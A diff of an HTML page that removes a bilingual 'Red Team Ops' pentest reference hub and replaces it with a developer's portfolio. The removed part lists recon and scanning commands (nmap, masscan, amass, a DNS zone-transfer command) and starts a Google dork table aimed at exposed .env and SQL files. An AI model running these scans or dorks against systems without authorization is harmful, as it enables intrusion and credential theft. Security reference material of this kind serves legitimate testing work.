-    opacity:0;transform:translateY(16px);transition:all .3s;pointer-events:none;}
-  #toTop.show{opacity:1;transform:none;pointer-events:auto;}
-  #toTop:hover{background:var(--red);color:#fff;box-shadow:0 0 16px rgba(255,0,51,.5);}
-
-  /* checklist progress meter */
-  .check-meter{height:3px;background:var(--border);margin-top:12px;overflow:hidden;}
-  .check-meter i{display:block;height:100%;width:0;background:var(--green);
-    box-shadow:0 0 8px var(--green);transition:width .4s ease;}
-
-  @media(max-width:900px){
-    .nav-toggle{display:flex;align-items:center;gap:8px;width:100%;padding:14px 0;
-      background:none;border:none;color:var(--red);font-family:var(--mono);font-size:12px;
-      letter-spacing:2px;cursor:crosshair;}
-    nav{flex-wrap:wrap;}
-    nav.collapsed .nav-btn{display:none;}
-    .nav-btn{flex:1 1 auto;text-align:center;}
-  }
-  @media (prefers-reduced-motion: reduce){
-    *{animation-duration:.001s !important;transition-duration:.05s !important;}
-    .reveal{opacity:1;transform:none;}
-  }
+/* ---------- footer ---------- */
+footer { border-top: 1px solid var(--line); padding: 32px 0 48px; color: var(--muted); font-size: 14px; }
+footer .wrap { display: flex; flex-wrap: wrap; justify-content: space-between; gap: 16px; }
+footer a { color: var(--text); }
+footer a:hover { color: var(--accent); }
 </style>
 </head>
 <body>
 
-<div id="progress"></div>
-
-<div id="boot">
-  <div class="boot-logo">RED <span>TEAM</span> OPS</div>
-  <div class="boot-lines" id="bootLines"></div>
-  <div class="boot-bar"><i></i></div>
-</div>
-
-<div id="cmdk">
-  <div class="cmdk-box" onclick="event.stopPropagation()">
-    <input class="cmdk-input" id="cmdkInput" autocomplete="off" spellcheck="false"
-      data-placeholder-en="Jump to section…  (type to filter)"
-      data-placeholder-id="Lompat ke bagian…  (ketik untuk filter)"
-      placeholder="Jump to section…  (type to filter)">
-    <div class="cmdk-list" id="cmdkList"></div>
-    <div class="cmdk-hint">
-      <span><b>↑↓</b> navigate</span><span><b>↵</b> open</span><span><b>esc</b> close</span><span><b>1–9</b> quick jump</span>
-    </div>
-  </div>
-</div>
-
-<div id="toast"></div>
-<button id="toTop" onclick="scrollTo({top:0,behavior:'smooth'})" aria-label="Back to top">↑</button>
-
-<header>
-  <div class="header-top">
-    <div class="logo-block">
-      <div class="logo-tag" data-en="⚠ AUTHORIZED USE ONLY ⚠" data-id="⚠ HANYA UNTUK PENGGUNAAN RESMI ⚠">⚠ AUTHORIZED USE ONLY ⚠</div>
-      <div class="logo-title" data-text="RED TEAM OPS">RED <span>TEAM</span> OPS</div>
-      <div class="logo-sub" data-en="// TACTICAL RESOURCE HUB v3.7 // ETHICAL HACKING REFERENCE //" data-id="// PUSAT SUMBER DAYA TAKTIS v3.7 // REFERENSI ETHICAL HACKING //">// TACTICAL RESOURCE HUB v3.7 // ETHICAL HACKING REFERENCE //</div>
-    </div>
-    <div class="header-right">
-      <div class="lang-toggle">
-        <button class="lang-btn active" onclick="setLang('en')">EN</button>
-        <div class="lang-divider"></div>
-        <button class="lang-btn" onclick="setLang('id')">ID</button>
-      </div>
-      <div class="status-panel">
-        <div class="status-line"><span data-en="SYSTEM" data-id="SISTEM">SYSTEM</span><div class="dot"></div><span class="status-val">ONLINE</span></div>
-        <div class="status-line"><span>MODE</span><div class="dot amber"></div><span class="status-val" style="color:var(--amber)">STEALTH</span></div>
-        <div class="status-line"><span data-en="ACCESS" data-id="AKSES">ACCESS</span><div class="dot red"></div><span class="status-val" style="color:var(--red)" data-en="RESTRICTED" data-id="TERBATAS">RESTRICTED</span></div>
-        <div class="status-line"><span data-en="TIME" data-id="WAKTU">TIME</span><span class="status-val" id="clock">--:--:--</span></div>
-      </div>
-    </div>
+<header class="top">
+  <div class="wrap">
+    <a class="brand" href="#">delfiboyz<span>.github.io</span></a>
+    <nav class="links">
+      <a href="#projects">Proyek</a>
+      <a class="opt" href="#archive">Arsip</a>
+      <a class="opt" href="#stack">Stack</a>
+      <a href="https://github.com/delfiboyz" target="_blank" rel="noopener">GitHub</a>
+      <button class="theme-btn" id="themeBtn" aria-label="Ganti tema">◐</button>
+    </nav>
   </div>
 </header>
 
-<div class="disclaimer">
-  ⚠ <strong data-en="DISCLAIMER:" data-id="PENAFIAN:">DISCLAIMER:</strong>
-  <span data-en="All content is for educational purposes & authorized penetration testing only. Use only on systems you have written permission to test. Misuse is a criminal offense."
-        data-id="Seluruh konten hanya untuk tujuan edukasi & penetration testing yang sah. Gunakan hanya pada sistem yang Anda miliki izin tertulis. Penyalahgunaan adalah pelanggaran hukum.">
-    All content is for educational purposes &amp; authorized penetration testing only. Use only on systems you have written permission to test. Misuse is a criminal offense.
-  </span> ⚠
-</div>
-
-<nav id="mainNav" class="collapsed">
-  <button class="nav-toggle" onclick="toggleNav()" data-en="☰ MENU" data-id="☰ MENU">☰ MENU</button>
-  <button class="nav-btn active" onclick="showSection('overview')"><span class="nav-num">01.</span><span data-en="OVERVIEW" data-id="RINGKASAN">OVERVIEW</span></button>
-  <button class="nav-btn" onclick="showSection('recon')"><span class="nav-num">02.</span>RECON</button>
-  <button class="nav-btn" onclick="showSection('dorks')"><span class="nav-num">03.</span>GOOGLE DORKS</button>
-  <button class="nav-btn" onclick="showSection('payloads')"><span class="nav-num">04.</span>PAYLOADS</button>
-  <button class="nav-btn" onclick="showSection('network')"><span class="nav-num">05.</span><span data-en="NETWORK" data-id="JARINGAN">NETWORK</span></button>
-  <button class="nav-btn" onclick="showSection('webapp')"><span class="nav-num">06.</span>WEB APP</button>
-  <button class="nav-btn" onclick="showSection('postex')"><span class="nav-num">07.</span><span data-en="POST-EXPLOIT" data-id="PASCA-EKSPLOIT">POST-EXPLOIT</span></button>
-  <button class="nav-btn" onclick="showSection('physical')"><span class="nav-num">08.</span><span data-en="PHYSICAL" data-id="FISIK">PHYSICAL</span></button>
-  <button class="nav-btn" onclick="showSection('checklist')"><span class="nav-num">09.</span>CHECKLIST</button>
-</nav>
-
 <main>
-  <aside>
-    <div class="sidebar-section">
-      <div class="sidebar-title" data-en="// QUICK NAV" data-id="// NAVIGASI CEPAT">// QUICK NAV</div>
-      <div class="sidebar-item" onclick="showSection('recon')"><span data-en="Network Recon" data-id="Rekon Jaringan">Network Recon</span><span class="count">12</span></div>
-      <div class="sidebar-item" onclick="showSection('dorks')">Google Dorks<span class="count">48</span></div>
-      <div class="sidebar-item" onclick="showSection('payloads')"><span data-en="XSS Payloads" data-id="Payload XSS">XSS Payloads</span><span class="count">24</span></div>
-      <div class="sidebar-item" onclick="showSection('payloads')"><span data-en="SQLi Payloads" data-id="Payload SQLi">SQLi Payloads</span><span class="count">18</span></div>
-      <div class="sidebar-item" onclick="showSection('payloads')"><span data-en="RCE Payloads" data-id="Payload RCE">RCE Payloads</span><span class="count">9</span></div>
-      <div class="sidebar-item" onclick="showSection('network')"><span data-en="Port Scanning" data-id="Pemindaian Port">Port Scanning</span><span class="count">6</span></div>
-      <div class="sidebar-item" onclick="showSection('physical')"><span data-en="Social Eng." data-id="Rekayasa Sosial">Social Eng.</span><span class="count">15</span></div>
-    </div>
-    <div class="sidebar-section">
-      <div class="sidebar-title" data-en="// RISK LEVEL" data-id="// TINGKAT RISIKO">// RISK LEVEL</div>
-      <div class="sidebar-item"><span style="color:var(--green)">●</span> <span data-en="LOW — Info Gathering" data-id="RENDAH — Pengumpulan Info">LOW — Info Gathering</span></div>
-      <div class="sidebar-item"><span style="color:var(--amber)">●</span> <span data-en="MEDIUM — Active Scan" data-id="SEDANG — Scan Aktif">MEDIUM — Active Scan</span></div>
-      <div class="sidebar-item"><span style="color:#ff6b35">●</span> <span data-en="HIGH — Exploitation" data-id="TINGGI — Eksploitasi">HIGH — Exploitation</span></div>
-      <div class="sidebar-item"><span style="color:var(--red)">●</span> <span data-en="CRITICAL — Post-Exploit" data-id="KRITIS — Pasca-Eksploit">CRITICAL — Post-Exploit</span></div>
-    </div>
-    <div class="sidebar-section">
-      <div class="sidebar-title" data-en="// TOOLS" data-id="// ALAT">// TOOLS</div>
-      <div class="sidebar-item">Nmap</div><div class="sidebar-item">Metasploit</div>
-      <div class="sidebar-item">Burp Suite</div><div class="sidebar-item">Wireshark</div>
-      <div class="sidebar-item">Hashcat</div><div class="sidebar-item">Aircrack-ng</div>
-      <div class="sidebar-item">SQLMap</div><div class="sidebar-item">Hydra</div>
-      <div class="sidebar-item">Cobalt Strike</div><div class="sidebar-item">BloodHound</div>
-    </div>
-  </aside>
+  <section class="hero">
+    <div class="wrap">
+      <div class="prompt">~$ whoami</div>
+      <h1>Delfi Fikri Mukarom<br><span class="grad">builds things that run.</span></h1>
+      <p class="lead">
+        Full Stack Developer yang suka membangun aplikasi web &amp; mobile, game, eksperimen AI/ML,
+        dan alat keamanan/kriptografi. Halaman ini merangkum repositori yang saya buat di GitHub.
+      </p>
+      <div class="cta">
+        <a class="btn primary" href="#projects">Lihat proyek</a>
+        <a class="btn" href="https://github.com/delfiboyz" target="_blank" rel="noopener">
+          <svg viewBox="0 0 16 16" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+          GitHub
+        </a>
+        <a class="btn" href="https://www.linkedin.com/in/delfi-fikri-mukarom" target="_blank" rel="noopener">
+          <svg viewBox="0 0 16 16" aria-hidden="true"><path d="M0 1.15C0 .52.52 0 1.17 0h13.66C15.48 0 16 .52 16 1.15v13.7c0 .63-.52 1.15-1.17 1.15H1.17C.52 16 0 15.48 0 14.85V1.15zM4.94 13.4V6.17H2.54v7.23h2.4zM3.74 5.18c.84 0 1.36-.56 1.36-1.25-.02-.71-.52-1.25-1.34-1.25-.82 0-1.36.54-1.36 1.25 0 .7.52 1.25 1.32 1.25h.02zm4.91 8.22V9.36c0-.22.02-.43.08-.59.17-.43.57-.88 1.23-.88.87 0 1.21.66 1.21 1.64v3.87h2.4V9.26c0-2.22-1.18-3.25-2.77-3.25-1.28 0-1.85.7-2.17 1.2v.02h-.01l.01-.02V6.17h-2.4c.03.68 0 7.23 0 7.23h2.4z"/></svg>
+          LinkedIn
+        </a>
+      </div>
 
-  <div class="content-area">
+      <div class="stats" id="stats"></div>
+    </div>
+  </section>
 
-    <!-- ═══════════════════════════════════════════════════ OVERVIEW -->
-    <div class="section active" id="sec-overview">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> <span data-en="MISSION OVERVIEW" data-id="RINGKASAN MISI">MISSION OVERVIEW</span></div>
-        <div class="section-badge" data-en="BRIEFING" data-id="PENGARAHAN">BRIEFING</div>
+  <section id="projects">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>Proyek Unggulan</h2>
+        <p>Repositori yang paling aktif dikembangkan.</p>
       </div>
-      <div class="alert-box warn">
-        <span>⚠</span>
-        <span data-en="All techniques below must only be used in the context of an authorized penetration test, bug bounty program, or lab environment. Always obtain written permission before testing."
-              data-id="Semua teknik berikut hanya boleh digunakan dalam konteks penetration testing resmi, bug bounty program, atau lingkungan lab. Pastikan selalu memiliki izin tertulis sebelum melakukan pengujian.">
-          All techniques below must only be used in the context of an authorized penetration test, bug bounty program, or lab environment. Always obtain written permission before testing.
-        </span>
+      <div class="toolbar">
+        <div class="chips" id="chips"></div>
+        <input class="search" id="search" type="search" placeholder="Cari proyek atau teknologi…" autocomplete="off">
       </div>
-      <div class="timeline">
-        <div class="timeline-item">
-          <div class="timeline-phase">Phase 01</div>
-          <div class="timeline-title" data-en="RECONNAISSANCE" data-id="PENGINTAIAN">RECONNAISSANCE</div>
-          <div class="timeline-body" data-en="Passive and active information gathering about the target. Includes OSINT, DNS enumeration, network mapping, and infrastructure analysis."
-               data-id="Pengumpulan informasi pasif dan aktif tentang target. Meliputi OSINT, DNS enumeration, network mapping, dan analisis infrastruktur.">
-            Passive and active information gathering about the target. Includes OSINT, DNS enumeration, network mapping, and infrastructure analysis.
-          </div>
-          <div class="timeline-tools"><span class="tool-pill">Maltego</span><span class="tool-pill">Shodan</span><span class="tool-pill">theHarvester</span><span class="tool-pill">Recon-ng</span><span class="tool-pill">OSINT Framework</span></div>
-        </div>
-        <div class="timeline-item">
-          <div class="timeline-phase">Phase 02</div>
-          <div class="timeline-title" data-en="SCANNING & ENUMERATION" data-id="PEMINDAIAN & ENUMERASI">SCANNING & ENUMERATION</div>
-          <div class="timeline-body" data-en="Identify active services, software versions, potential vulnerabilities, and exploitable attack surfaces."
-               data-id="Identifikasi layanan aktif, versi software, vulnerabilitas potensial, dan attack surface yang dapat dieksploitasi.">
-            Identify active services, software versions, potential vulnerabilities, and exploitable attack surfaces.
-          </div>
-          <div class="timeline-tools"><span class="tool-pill">Nmap</span><span class="tool-pill">Masscan</span><span class="tool-pill">Nikto</span><span class="tool-pill">Gobuster</span><span class="tool-pill">Nessus</span></div>
-        </div>
-        <div class="timeline-item">
-          <div class="timeline-phase">Phase 03</div>
-          <div class="timeline-title" data-en="GAINING ACCESS" data-id="MENDAPATKAN AKSES">GAINING ACCESS</div>
-          <div class="timeline-body" data-en="Exploit vulnerabilities to gain initial access. Includes web application attacks, network exploitation, and social engineering."
-               data-id="Eksploitasi vulnerabilitas untuk mendapatkan akses awal. Termasuk serangan pada aplikasi web, jaringan, dan social engineering.">
-            Exploit vulnerabilities to gain initial access. Includes web application attacks, network exploitation, and social engineering.
-          </div>
-          <div class="timeline-tools"><span class="tool-pill">Metasploit</span><span class="tool-pill">Burp Suite</span><span class="tool-pill">SQLMap</span><span class="tool-pill">Hydra</span><span class="tool-pill">BeEF</span></div>
-        </div>
-        <div class="timeline-item">
-          <div class="timeline-phase">Phase 04</div>
-          <div class="timeline-title" data-en="MAINTAINING ACCESS" data-id="MEMPERTAHANKAN AKSES">MAINTAINING ACCESS</div>
-          <div class="timeline-body" data-en="Persistence on the target system, privilege escalation, lateral movement, and bypassing security mechanisms."
-               data-id="Persistensi pada sistem target, privilege escalation, lateral movement, dan bypass mekanisme keamanan.">
-            Persistence on the target system, privilege escalation, lateral movement, and bypassing security mechanisms.
-          </div>
-          <div class="timeline-tools"><span class="tool-pill">Mimikatz</span><span class="tool-pill">BloodHound</span><span class="tool-pill">Cobalt Strike</span><span class="tool-pill">Empire</span></div>
-        </div>
-        <div class="timeline-item">
-          <div class="timeline-phase">Phase 05</div>
-          <div class="timeline-title" data-en="REPORTING & REMEDIATION" data-id="PELAPORAN & REMEDIASI">REPORTING & REMEDIATION</div>
-          <div class="timeline-body" data-en="Document findings, analyze impact, provide mitigation recommendations, and present results to stakeholders."
-               data-id="Dokumentasi temuan, analisis dampak, rekomendasi mitigasi, dan presentasi hasil kepada stakeholder.">
-            Document findings, analyze impact, provide mitigation recommendations, and present results to stakeholders.
-          </div>
-          <div class="timeline-tools"><span class="tool-pill">Dradis</span><span class="tool-pill">Serpico</span><span class="tool-pill">CVSS Calculator</span></div>
-        </div>
+      <div class="grid" id="grid"></div>
+      <p class="empty" id="empty">Tidak ada proyek yang cocok.</p>
+    </div>
+  </section>
+
+  <section id="archive">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>Arsip &amp; Latihan</h2>
+        <p>Proyek lebih kecil, tugas kuliah, dan eksperimen belajar.</p>
       </div>
-      <div class="risk-grid">
-        <div class="risk-cell risk-header"></div>
-        <div class="risk-cell risk-header" data-en="VERY LOW" data-id="SANGAT RENDAH">VERY LOW</div>
-        <div class="risk-cell risk-header" data-en="LOW" data-id="RENDAH">LOW</div>
-        <div class="risk-cell risk-header" data-en="HIGH" data-id="TINGGI">HIGH</div>
-        <div class="risk-cell risk-header" data-en="CRITICAL" data-id="KRITIS">CRITICAL</div>
-        <div class="risk-cell risk-label">RECON</div><div class="risk-cell risk-low">✓</div><div class="risk-cell risk-low">✓</div><div class="risk-cell risk-med">~</div><div class="risk-cell risk-high">✗</div>
-        <div class="risk-cell risk-label">SCAN</div><div class="risk-cell risk-low">✓</div><div class="risk-cell risk-med">~</div><div class="risk-cell risk-high">!</div><div class="risk-cell risk-crit">✗</div>
-        <div class="risk-cell risk-label">EXPLOIT</div><div class="risk-cell risk-med">~</div><div class="risk-cell risk-high">!</div><div class="risk-cell risk-crit">!!</div><div class="risk-cell risk-crit">✗✗</div>
-        <div class="risk-cell risk-label">POST-EX</div><div class="risk-cell risk-high">!</div><div class="risk-cell risk-crit">!!</div><div class="risk-cell risk-crit">!!!</div><div class="risk-cell risk-crit">✗✗✗</div>
+      <div class="archive-wrap">
+        <table class="archive">
+          <thead><tr><th>Repo</th><th class="col-lang">Bahasa</th><th>Keterangan</th></tr></thead>
+          <tbody id="archiveBody"></tbody>
+        </table>
       </div>
     </div>
+  </section>
 
-    <!-- ═══════════════════════════════════════════════════ RECON -->
-    <div class="section" id="sec-recon">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> RECONNAISSANCE</div>
-        <div class="section-badge">PHASE 01</div>
+  <section id="stack">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>Tech Stack</h2>
+        <p>Diambil dari teknologi yang dipakai di repositori di atas.</p>
       </div>
-      <div class="cat-grid">
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🔍</div><div class="card-name">PASSIVE OSINT</div><div class="card-tag tag-osint">OSINT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Information gathering techniques with no direct interaction with the target."
-                 data-id="Teknik pengumpulan informasi tanpa interaksi langsung dengan target.">
-              Information gathering techniques with no direct interaction with the target.
-            </div>
-            <ul class="card-items">
-              <li data-en="Shodan.io — IoT device & open server search engine" data-id="Shodan.io — Mesin pencari perangkat IoT & server terbuka">Shodan.io — IoT device &amp; open server search engine</li>
-              <li data-en="Censys.io — Internet-wide scan, TLS certificates & ports" data-id="Censys.io — Scan internet-wide, sertifikat TLS, & port">Censys.io — Internet-wide scan, TLS certificates &amp; ports</li>
-              <li data-en="FOFA — Shodan alternative with richer fingerprinting" data-id="FOFA — Alternatif Shodan dengan fingerprint lebih kaya">FOFA — Shodan alternative with richer fingerprinting</li>
-              <li data-en="Hunter.io — Employee email enumeration from domain" data-id="Hunter.io — Enumeration email karyawan dari domain">Hunter.io — Employee email enumeration from domain</li>
-              <li data-en="LinkedIn OSINT — Org structure & employee roles" data-id="LinkedIn OSINT — Struktur organisasi & jabatan karyawan">LinkedIn OSINT — Org structure &amp; employee roles</li>
-              <li data-en="Wayback Machine — Old site versions, hidden files" data-id="Wayback Machine — Versi lama website, file tersembunyi">Wayback Machine — Old site versions, hidden files</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🌐</div><div class="card-name">DNS ENUMERATION</div><div class="card-tag tag-recon">RECON</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="DNS infrastructure mapping to discover subdomains and hidden records."
-                 data-id="Pemetaan infrastruktur DNS untuk menemukan subdomain & record tersembunyi.">
-              DNS infrastructure mapping to discover subdomains and hidden records.
-            </div>
-            <ul class="card-items">
-              <li><code>amass enum -d target.com</code> — <span data-en="Subdomain brute + passive" data-id="Subdomain brute + pasif">Subdomain brute + passive</span></li>
-              <li><code>subfinder -d target.com</code> — <span data-en="Multi-source subdomain finder" data-id="Pencari subdomain multi-sumber">Multi-source subdomain finder</span></li>
-              <li><code>dnsx -l subdomains.txt -a</code> — <span data-en="Mass DNS resolution" data-id="Resolusi DNS massal">Mass DNS resolution</span></li>
-              <li><code>dig target.com ANY</code> — <span data-en="All DNS records" data-id="Semua record DNS">All DNS records</span></li>
-              <li><code>fierce --domain target.com</code> — <span data-en="DNS recon & zone transfer" data-id="Rekon DNS & zone transfer">DNS recon &amp; zone transfer</span></li>
-              <li><code>dnsrecon -d target.com -t axfr</code> — <span data-en="Zone transfer attack" data-id="Serangan zone transfer">Zone transfer attack</span></li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">📡</div><div class="card-name">PORT & SERVICE SCAN</div><div class="card-tag tag-recon">RECON</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Identify open ports, active services, and software versions on the target."
-                 data-id="Identifikasi port terbuka, layanan aktif, dan versi software pada target.">
-              Identify open ports, active services, and software versions on the target.
-            </div>
-            <ul class="card-items">
-              <li><code>nmap -sV -sC -O target.com</code> — <span data-en="Full scan + OS detection" data-id="Scan penuh + deteksi OS">Full scan + OS detection</span></li>
-              <li><code>nmap -p- --min-rate 5000 target</code> — <span data-en="All 65535 ports" data-id="Semua 65535 port">All 65535 ports</span></li>
-              <li><code>masscan -p1-65535 target --rate=10000</code> — <span data-en="Ultra fast scan" data-id="Scan sangat cepat">Ultra fast scan</span></li>
-              <li><code>nmap --script vuln target</code> — <span data-en="NSE vulnerability scripts" data-id="Skrip NSE untuk vuln">NSE vulnerability scripts</span></li>
-              <li><code>rustscan -a target -- -sV</code> — <span data-en="Rust-based speed scan" data-id="Scan cepat berbasis Rust">Rust-based speed scan</span></li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🕸️</div><div class="card-name">WEB FINGERPRINTING</div><div class="card-tag tag-recon">RECON</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Identify technologies, frameworks, and CMS used by the target."
-                 data-id="Identifikasi teknologi, framework, dan CMS yang digunakan target.">
-              Identify technologies, frameworks, and CMS used by the target.
-            </div>
-            <ul class="card-items">
-              <li data-en="WhatWeb — Technology & CMS plugin detection" data-id="WhatWeb — Deteksi teknologi & plugin CMS">WhatWeb — Technology &amp; CMS plugin detection</li>
-              <li data-en="Wappalyzer — Browser ext. technology fingerprint" data-id="Wappalyzer — Fingerprint teknologi via browser">Wappalyzer — Browser ext. technology fingerprint</li>
-              <li><code>nikto -h target.com</code> — <span data-en="Web server vulnerability scan" data-id="Scan vulnerabilitas web server">Web server vulnerability scan</span></li>
-              <li><code>gobuster dir -u URL -w wordlist</code> — <span data-en="Directory brute force" data-id="Brute force direktori">Directory brute force</span></li>
-              <li><code>ffuf -u URL/FUZZ -w list.txt</code> — <span data-en="Fast web fuzzer" data-id="Fuzzer web cepat">Fast web fuzzer</span></li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">👤</div><div class="card-name">PEOPLE OSINT</div><div class="card-tag tag-osint">OSINT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Gathering individual-level information for social engineering campaigns."
-                 data-id="Pengumpulan informasi terkait individu untuk social engineering.">
-              Gathering individual-level information for social engineering campaigns.
-            </div>
-            <ul class="card-items">
-              <li data-en="Maltego — Visual link analysis & entity mapping" data-id="Maltego — Analisis link visual & pemetaan entitas">Maltego — Visual link analysis &amp; entity mapping</li>
-              <li data-en="theHarvester — Emails, subdomains, IPs from public sources" data-id="theHarvester — Email, subdomain, IP dari sumber publik">theHarvester — Emails, subdomains, IPs from public sources</li>
-              <li data-en="Social Mapper — Cross-platform facial recognition" data-id="Social Mapper — Pengenalan wajah lintas platform">Social Mapper — Cross-platform facial recognition</li>
-              <li data-en="GitHub OSINT — Exposed credentials & API keys in repos" data-id="GitHub OSINT — Kredensial & API key bocor di repo">GitHub OSINT — Exposed credentials &amp; API keys in repos</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">📦</div><div class="card-name">METADATA EXTRACTION</div><div class="card-tag tag-osint">OSINT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Extract metadata from public documents to uncover internal information."
-                 data-id="Ekstraksi metadata dari dokumen publik untuk informasi internal.">
-              Extract metadata from public documents to uncover internal information.
-            </div>
-            <ul class="card-items">
-              <li><code>exiftool document.pdf</code> — <span data-en="Author, software, GPS data" data-id="Penulis, software, data GPS">Author, software, GPS data</span></li>
-              <li data-en="FOCA — Metadata from web documents (PDF, Office)" data-id="FOCA — Metadata dari dokumen web (PDF, Office)">FOCA — Metadata from web documents (PDF, Office)</li>
-              <li data-en="metagoofil — Documents from Google & metadata" data-id="metagoofil — Dokumen dari Google & metadata">metagoofil — Documents from Google &amp; metadata</li>
-              <li data-en="Social media photos — GPS, device, time from shared images" data-id="Foto media sosial — GPS, perangkat, waktu dari foto">Social media photos — GPS, device, time from shared images</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-      <div class="terminal">
-        <div class="terminal-bar"><div class="term-dot td-red"></div><div class="term-dot td-amber"></div><div class="term-dot td-green"></div><span>terminal@redteam ~ nmap session</span></div>
-        <div class="terminal-body">
-<span class="t-comment"># Comprehensive Nmap scan</span>
-<span class="t-prompt">root@kali:~# </span><span class="t-cmd">nmap -sV -sC -O -A -p- --min-rate 1000 -oN scan.txt 192.168.1.0/24</span>
-<span class="t-out">Starting Nmap 7.94 ( https://nmap.org )</span>
-<span class="t-out">PORT     STATE SERVICE    VERSION</span>
-<span class="t-out">22/tcp   open  ssh        OpenSSH 8.2p1</span>
-<span class="t-out">80/tcp   open  http       Apache httpd 2.4.41</span>
-<span class="t-out">443/tcp  open  ssl/https  nginx 1.18.0</span>
-<span class="t-out">3306/tcp open  mysql      MySQL 8.0.28</span>
-<span class="t-err">admin.target.com [INTERESTING]</span>
-<span class="t-comment">
-# Subdomain enumeration</span>
-<span class="t-prompt">root@kali:~# </span><span class="t-cmd">amass enum -passive -d target.com | tee subdomains.txt</span>
-<span class="t-out">api.target.com</span>
-<span class="t-out">dev.target.com</span>
-<span class="t-out">staging.target.com</span>
-<span class="t-err">admin.target.com [FOUND]</span>
-        </div>
+      <div class="stack">
+        <div class="box"><h4>Web</h4><div class="tags">
+          <span class="tag">JavaScript</span><span class="tag">TypeScript</span><span class="tag">React</span><span class="tag">Next.js</span><span class="tag">Vite</span><span class="tag">Tailwind CSS</span><span class="tag">Node.js</span><span class="tag">Express</span><span class="tag">Socket.IO</span><span class="tag">PHP</span>
+        </div></div>
+        <div class="box"><h4>Mobile &amp; Desktop</h4><div class="tags">
+          <span class="tag">Kotlin</span><span class="tag">React Native</span><span class="tag">Expo</span><span class="tag">Electron</span><span class="tag">PWA</span>
+        </div></div>
+        <div class="box"><h4>AI / ML</h4><div class="tags">
+          <span class="tag">Python</span><span class="tag">OpenCV</span><span class="tag">Keras</span><span class="tag">TensorFlow.js</span><span class="tag">DeepFace</span><span class="tag">Transformers.js</span><span class="tag">Flask</span>
+        </div></div>
+        <div class="box"><h4>Game</h4><div class="tags">
+          <span class="tag">Unity</span><span class="tag">C#</span><span class="tag">pygame-ce</span><span class="tag">HTML5 Canvas</span>
+        </div></div>
+        <div class="box"><h4>Security &amp; Crypto</h4><div class="tags">
+          <span class="tag">Web Crypto API</span><span class="tag">AES-256-GCM</span><span class="tag">Tor</span><span class="tag">Nmap</span><span class="tag">Steganalysis</span>
+        </div></div>
+        <div class="box"><h4>Lainnya</h4><div class="tags">
+          <span class="tag">Java</span><span class="tag">C++</span><span class="tag">Django</span><span class="tag">MongoDB</span><span class="tag">MySQL</span><span class="tag">Docker</span><span class="tag">GitHub Actions</span>
+        </div></div>
       </div>
     </div>
-
-    <!-- ═══════════════════════════════════════════════════ DORKS -->
-    <div class="section" id="sec-dorks">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> GOOGLE DORKS</div>
-        <div class="section-badge">48 DORKS</div>
-      </div>
-      <div class="alert-box info">
-        <span>ℹ</span>
-        <span data-en="Google Dorks use advanced search operators to find sensitive information accidentally indexed. Use only for authorized bug bounty & security assessments."
-              data-id="Google Dorks menggunakan operator pencarian lanjutan untuk menemukan informasi sensitif yang terindeks secara tidak sengaja. Gunakan hanya untuk bug bounty & assessment resmi.">
-          Google Dorks use advanced search operators to find sensitive information accidentally indexed. Use only for authorized bug bounty &amp; security assessments.
-        </span>
-      </div>
-      <div class="search-bar">
-        <div class="search-label" data-en="FILTER DORKS" data-id="FILTER DORK">FILTER DORKS</div>
-        <input type="text" class="search-input" id="dorkSearch" oninput="filterDorks()"
-          data-placeholder-en="Search dorks by category or keyword..."
-          data-placeholder-id="Cari dork berdasarkan kategori atau keyword..."
-          placeholder="Search dorks by category or keyword...">
-      </div>
-      <table class="dork-table" id="dorkTable">
-        <thead>
-          <tr>
-            <th data-en="CATEGORY" data-id="KATEGORI">CATEGORY</th>
-            <th data-en="DORK QUERY" data-id="KUERI DORK">DORK QUERY</th>
-            <th data-en="PURPOSE" data-id="TUJUAN">PURPOSE</th>
-          </tr>
-        </thead>
-        <tbody id="dorkBody">
-          <tr><td><span class="dork-cat">EXPOSED FILES</span></td><td><span class="dork-query">site:target.com filetype:sql</span></td><td data-en="Exposed SQL database files" data-id="File database SQL yang terexpose">Exposed SQL database files</td></tr>
-          <tr><td><span class="dork-cat">EXPOSED FILES</span></td><td><span class="dork-query">site:target.com filetype:env</span></td><td data-en=".env file with credentials" data-id="File .env dengan kredensial">.env file with credentials</td></tr>
-          <tr><td><span class="dork-cat">EXPOSED FILES</span></td><td><span class="dork-query">site:target.com filetype:log</span></td><td data-en="Application & server log files" data-id="File log aplikasi & server">Application &amp; server log files</td></tr>
